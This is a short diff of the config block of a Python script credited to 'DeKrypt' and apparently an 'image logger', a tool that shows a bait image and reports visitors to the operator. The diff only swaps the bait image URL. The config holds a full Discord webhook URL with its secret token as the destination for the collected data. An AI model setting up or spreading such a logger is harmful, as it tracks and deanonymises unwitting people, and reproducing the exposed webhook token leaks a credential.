@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1132411034112626698/7Mbtn1RU2xxz3zi-EwxkQfQXoBirLqTJ7Gx04b6tpwZg5Adh9JRk3i50aYnFNOdLXBM6",
-    "image": "https://conteudo.imguol.com.br/c/bol/fotos/9c/2016/04/14/14abr2016---se-prepare-para-fazer-uma-viagem-ao-lado-oculto-e-sombrio-da-internet-a-deep-web-na-realidade-ela-se-trata-apenas-de-uma-area-online-com-sites-foruns-e-comunidades-iguais-aos-que-1460635044857_300x300.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://conteudo.imguol.com.br/c/bol/fotos/80/2016/04/14/14abr2016---em-2003-a-foto-wild-child-crianca-selvagem-em-traducao-foi-feita-pelas-maos-do-fotografo-norte-americano-roger-ballen-que-no-projeto-camara-das-sombras-criou-tantas-fotos-1460639236591_300x300.jpg.webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
